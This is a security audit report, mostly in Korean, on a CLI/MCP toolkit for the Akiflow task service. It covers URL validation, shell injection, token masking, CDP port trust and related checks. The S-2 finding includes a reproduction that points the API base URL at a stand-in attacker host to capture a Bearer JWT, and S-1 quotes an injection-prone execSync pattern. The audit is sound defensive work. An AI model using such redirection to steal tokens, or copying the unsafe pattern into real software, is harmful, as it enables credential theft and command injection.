---
title: "Security Audit Report — akiflow-toolkit"
createdAt: 2026-04-19T23:25:00+09:00
updatedAt: 2026-04-19T23:25:00+09:00
version: "1.0.0"
type: report
tags:
  - security
  - audit
  - findings
---

# Security Audit Report

Audit scope, threat model, method: `TASK-security-audit.md`.

## TL;DR

| Level | 건수 |
|------|------|
| 🔴 Critical | 0 |
| 🟠 High | 0 |
| 🟡 Medium | 1 |
| 🟢 Low | 3 |
| ℹ️ Info | 11 |

**한 줄 총평**: 기본 보안 위생은 양호(`bun audit` 0 건, 파일 권한 0600/0700, stderr 마스킹, stdout 보호, SECURITY.md 존재). 즉시 수정 가치가 있는 것은 **S-2 (URL env 검증 부재) + S-1 (shell injection 방어 심화)** 두 가지.

---

## Findings

### 🟡 S-2 | `AF_API_BASE_URL` / `AF_AUTH_BASE_URL` 검증 부재 [Medium]

**위치**: `src/config.ts:70-71`

```ts
apiBaseUrl: env.AF_API_BASE_URL ?? DEFAULT_API_BASE_URL,
authBaseUrl: env.AF_AUTH_BASE_URL ?? DEFAULT_AUTH_BASE_URL,
```

**문제**:
- 사용자/악성 환경변수가 임의의 URL을 주입 가능
- HTTP 허용 → MITM으로 Bearer JWT 평문 전송 위험
- 외부 도메인 가능 → 토큰 탈취 서버(`attacker.com`)로 유도 → credential 유출
- 실수 시나리오: dev 환경 rc 파일에 내부 mock URL이 남아 production에 번짐

**영향**: 로컬 계정에서 AF_API_BASE_URL이 adversarial하게 설정되면 `Authorization: Bearer <JWT>` 헤더가 attacker 서버로 전송됨.

**공격 재현**:
```bash
export AF_API_BASE_URL=http://attacker.example.com
bun run src/index.ts ls
# → attacker가 Bearer JWT 캡처
```

**권장 수정**:
```ts
function parseUrl(value: string | undefined, fallback: string, field: string): string {
  if (!value) return fallback;
  try {
    const u = new URL(value);
    if (u.protocol !== "https:") throw new Error(`${field} must be https://`);
    return u.toString().replace(/\/$/, "");
  } catch (err) {
    throw new Error(`Invalid ${field}: ${value} — ${(err as Error).message}`);
  }
}
```
- HTTPS 강제
- URL 파싱 가능 여부
- (옵션) `akiflow.com` suffix 화이트리스트 — dev mode는 `AF_ALLOW_INSECURE_BASE_URL=1`로 opt-out

### 🟢 S-1 | Shell injection pattern (defense-in-depth) [Low]

**위치**:
- `src/adapters/browser/chrome-cookie.ts:19-20`
  ```ts
  const cmd = `security find-generic-password -s "${service}" -w`;
  return execSync(cmd, { encoding: "utf-8" }).trim();
  ```
- `src/adapters/browser/cdp-launcher.ts:82-89`
  ```ts
  const out = execSync(`command -v ${cmd}`, { encoding: "utf-8" }).trim();
  ```

**문제**:
- 템플릿 문자열이 셸을 거쳐 실행됨 (`execSync` 기본이 `/bin/sh -c`)
- 현재 caller는 hardcoded 상수 (`MACOS_BROWSERS.keychainService`, `LINUX_CHROME_CANDIDATES`) — **현재 exploit 경로 없음**
- 하지만 패턴 자체가 dangerous — 누군가 browser 설정에 환경변수/사용자 입력 값을 추가하면 즉시 RCE

**권장 수정**:
- `security` 호출: `execFileSync('security', ['find-generic-password', '-s', service, '-w'])` — 셸 개입 없음
- `command -v`: bash builtin이라 `execFile` 불가 → `which(1)` (executable)로 대체 또는 input whitelist `/^[a-zA-Z0-9._/-]+$/`

### 🟢 S-5 | Raw binary 토큰이 debug 로그에서 마스킹 안 됨 [Low]

**위치**: `src/adapters/observability/stderr-logger.ts:29`

```ts
const MASK_PATTERNS: RegExp[] = [
  /eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g,  // JWT
  /def50200[a-f0-9]{20,}/g,                                  // Laravel Passport refresh
];
```

**문제**: `MASK_KEYS`로 `accessToken`, `refreshToken` 키는 통으로 `***` 치환 → 안전. 하지만:
- Chrome cookie tier의 raw binary (e.g. `1U:\x..\xa3\x..`)는 pattern 미매치
- 이 binary가 error message나 stack trace로 흘러들어가면 stderr에 평문 노출 가능
- 예: `AkiflowHttpAdapter.request` catch 블록이 `fetch failed: GET /v5/tasks`만 기록하지만, `err.cause`가 Bun fetch TypeError (본문에 raw Bearer value 포함)이고 logger가 실수로 cause까지 로깅하면 노출

**실제 재현 확률**: 낮음 (현재 `toolError`는 `cause` 미기록).
**대응**: Cookie tier misattribution fix와 함께 해결 (raw binary는 애초에 accessToken에 저장되지 말아야 함). `stderr-logger`에 control-char 밀도 기반 마스킹 추가 고려.

### 🟢 S-13 | CDP WebSocket localhost trust [Low]

**위치**: `src/adapters/browser/cdp-launcher.ts:222-245`

**문제**: `getWebSocketUrl`이 `http://127.0.0.1:9222/json/version`을 신뢰. 만약 악성 로컬 프로세스가 port 9222를 선점하면 Chrome 대신 attacker 프로세스와 WebSocket 협상. 이 프로세스가 CDP 응답을 흉내내면 가짜 토큰 주입 가능.

**완화**:
- `this.whichFn`으로 실제 Chrome 바이너리 경로 확인 후 spawn (현재 O)
- spawn한 child process PID가 live한지 확인 (현재 X)
- `Chrome-Version` 헤더 또는 `Browser` 응답 필드 검증 (현재 X)

**우선순위**: 낮음 — 이미 localhost bind + 우리가 직접 spawn한 child가 현존하는 환경.

### ℹ️ S-3 | ReDoS 검사 [Info — 안전]

```
/def50200[a-f0-9]{200,}/             × 100k adversarial  = 0.08 ms
/eyJ[A-Za-z0-9_-]{10,}\.[.]+\.[.]+/g × 100k adversarial  = 0.20 ms
```
Nested quantifier 없음 → catastrophic backtracking 불가. **안전**.

### ℹ️ S-4 | 파일 권한 [Info — 양호]

| 대상 | mode | 검증 |
|------|------|------|
| `auth.json` | `0o600` | `xdg-storage.ts:29` ✓ |
| `configDir` | `0o700` | `xdg-storage.ts:27` ✓ |
| `cacheDir` | `0o700` | `sync-cache.ts:133` ✓ |
| `pendingDir` | `0o700` | `sync-cache.ts:137` ✓ |
| cache files | `0o600` | `sync-cache.ts:95, 167` ✓ |

### ℹ️ S-6 | `spawn()` safe array args [Info — 안전]

```ts
spawn(cmd, args as string[], { stdio: "ignore", detached: false });
```
Array form → no shell interpretation. ✓

### ℹ️ S-7 | Release workflow permissions [Info — 대체로 양호]

- 최상위 `permissions: contents: read` ✓
- `release` job: `contents: write, issues: write, pull-requests: write, id-token: write` — semantic-release 요구사항에 부합
- `persist-credentials: false` ✓
- **개선 여지**: GitHub Actions가 major tag(`@v6`) 핀 — 완전한 공급망 강화는 SHA 핀이 권장. 이 저장소 규모에는 major tag 가 실용적이나, OIDC provenance(W7) 전환 후 SHA 핀도 검토 가치.

### ℹ️ S-8 | `SECURITY.md` 존재 [Info — 양호]

- CVD 이메일 채널 명시 (`ty.kim@modusign.co.kr`)
- Token 저장 경로/권한 명시
- log masking 언급 (ADR-0009)

### ℹ️ S-9 | MCP tool input validation [Info — 양호]

- 모든 MCP tool이 zod `inputSchema` 적용
- ADR-0008 `isError` boundary → throw 대신 구조화 실패 응답
- `complete_task`, `delete_task`에 `destructiveHint` annotation

### ℹ️ S-10 | `.gitignore` [Info — 양호]

`auth.json`, `**/auth.json`, `.env*`, `dist/`, `node_modules/` 포함. ✓

### ℹ️ S-11 | Dependency audit [Info — 통과]

```
$ bun audit
No vulnerabilities found
```

### ℹ️ S-12 | MCP stdout 보호 [Info — 양호]

- ADR-0009 기반: 모든 로그는 stderr로
- `server.test.ts`에 `process.stdout.write` spy로 서버 기동 중 stdout 오염 0 확인

### ℹ️ S-14 | `setManualToken` 입력 처리 [Info — 양호]

- readline으로 stdin 받고 `.trim()`
- JSON body로 POST → shell/SQL injection 해당 없음

### ℹ️ S-15 | `NetworkError.cause` 누락 [Info — 별도 이슈]

로깅 개선 관점 이슈, 보안 이슈는 아님. `toolError`가 `err.cause`를 비기록 → 디버깅 부담은 있으나 정보 누출 없음.

---

## Prioritized Action Plan

| # | Finding | Action | Status |
|---|---------|--------|--------|
| 1 | S-2 | `config.ts`에 URL 검증 (HTTPS 강제, URL 파싱) | ✅ 완료 |
| 2 | S-1 | `chrome-cookie.ts`, `cdp-launcher.ts`의 `execSync` → `execFileSync`(+input whitelist) | ✅ 완료 |
| 3 | S-5 | Cookie tier misattribution (raw bytes을 accessToken에 저장 금지) + stderr logger binary collapse | ✅ 완료 |
| 4 | S-7 | 모든 GitHub Actions third-party use를 SHA 핀 + 주석에 semver 병기 | ✅ 완료 |
| 5 | S-13 | `/json/version` Browser identity 검증 + wsUrl localhost:port 검증 + optional `validateTokenFn` hook | ✅ 완료 |

## Deliverables (이번 세션)

- [x] SECURITY-AUDIT-REPORT.md (본 문서)
- [x] S-1, S-2, S-5, S-7, S-13 fix patch 적용
- [x] 신규 보안 테스트 20+개 추가 (config URL, cookie tier, binary masking, port-squat, validator)
- [x] Full suite 425/425 green · tsc clean

## Related

- `TASK-security-audit.md` — 감사 계획
- `docs/akiflow-token-acquisition.md` §4, §10 — cookie tier 버그 (S-5와 연결)
- ADR-0009 stdout 보호 (S-12)
- ADR-0003 auth recovery (S-2와 연결)
